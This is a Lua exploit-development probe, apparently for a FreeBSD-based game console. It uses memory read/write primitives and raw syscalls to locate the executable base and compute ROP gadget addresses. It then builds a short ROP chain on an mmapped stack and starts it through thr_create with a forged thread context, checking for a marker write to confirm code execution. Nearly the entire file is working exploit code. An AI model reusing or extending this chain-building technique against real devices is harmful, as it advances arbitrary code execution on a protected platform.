-- CRASH_CLASS: LOW
-- PROBE 531s: Minimal ROP chain test via thr_create
--
-- 531p works: RIP=mov_rdi_rax;ret, direct gadget, jmp$ on ret.
-- 531r dies: RIP=pop_rax;ret with chain on stack.
--
-- Test: simplest possible chain:
-- RIP = pop_rax_ret
-- RSP → [marker_value, pop_rdi_ret, &shared, mov_rdi_rax_ret, jmp_self]
-- This chains: pop rax → marker, pop rdi → shared, mov [rdi],rax;ret, jmp $

print("=== PROBE 531s: CHAIN TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)

-- Find jmp $
local jmp_self = nil
for off = 0, 0x100000, 4 do
    local v = rd(eboot + off)
    if v then
        local vn = v; if vn < 0 then vn = vn + 0x100000000 end
        if (vn % 0x10000) == 0xFEEB then
            jmp_self = eboot + uint64(off); break
        end
        if math.floor(vn/0x100) % 0x10000 == 0xFEEB then
            jmp_self = eboot + uint64(off+1); break
        end
    end
end
print("jmp$=" .. (jmp_self and q(jmp_self) or "NONE"))

-- Shared and stack via mmap
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)

local ok_st, stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(stack, 0x4000)

print("shared=" .. q(shared) .. " stack=" .. q(stack))

-- Build chain near the TOP of stack (like 156d)
local chain_base = stack + 0x10000 - 0x200
local i = 0
local function emit(val) wq(chain_base + i, val); i = i + 8 end

-- pop_rax_ret is RIP, so first thing: pop [rsp] → RAX
emit(uint64("0xCAFEBABE1234"))  -- [0] value for RAX
emit(pop_rdi_ret)               -- [8] next: pop rdi
emit(shared)                    -- [16] RDI = &shared
emit(mov_rdi_rax_ret)           -- [24] [rdi]=rax → write marker
emit(jmp_self)                  -- [32] park thread

print("chain: " .. i .. " bytes at " .. q(chain_base))

-- Context
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)     -- RIP
wq(ctx + 0x0F8, chain_base)      -- RSP

-- Verify chain in memory
print("chain[0]=" .. q(rq(chain_base)))
print("chain[8]=" .. q(rq(chain_base + 8)))
print("chain[16]=" .. q(rq(chain_base + 16)))
print("chain[24]=" .. q(rq(chain_base + 24)))
print("chain[32]=" .. q(rq(chain_base + 32)))

-- thr_create
print("[thr_create]")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

-- Wait
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 300000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

-- Check
local got = rq(shared)
print("  marker=" .. q(got))
local ok_k, rv_k = pcall(function() return sc_thr_kill(rq(tid_buf), uint64(0)) end)
print("  thr_kill=" .. tostring(to_num(rv_k)))

if got and to_num(got) ~= 0 then
    print("  CHAIN WORKS!")
else
    print("  CHAIN FAILED")
end

print("=== 531s DONE ===")
